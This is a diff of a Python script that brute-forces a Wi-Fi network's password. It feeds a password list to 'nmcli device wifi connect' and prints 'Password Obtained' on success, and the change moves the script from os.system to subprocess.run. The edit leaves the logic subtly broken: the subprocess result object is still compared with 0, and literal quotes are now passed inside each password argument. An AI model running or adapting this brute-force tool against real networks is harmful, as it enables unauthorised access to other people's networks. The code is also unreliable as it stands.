@@ -13,7 +13,6 @@ import sys
 import os
 import time
 import subprocess
-flag = False
 
 os.system("nmcli device wifi")
 
@@ -65,19 +64,19 @@ for pswd in pswd_lst:
     try:
 	    pswd = f"\"{pswd}\""
 
-	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
-	    #cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
-	    #result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+	    #cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
+	    cmd = ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', pswd]
+	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
 
 	    print("trying : " + pswd)
 	    
-	    result = os.system(cmd)
+	    #result = os.system(cmd)
 	    time.sleep(2)
 	    
 	    if (result == 0):
 	        print(f"Password Obtained {pswd}")
-	        os.system("sudo systemctl isolate graphical.target")
+	        #os.system("sudo systemctl isolate graphical.target")
 	        break
 	        
 	    else: 
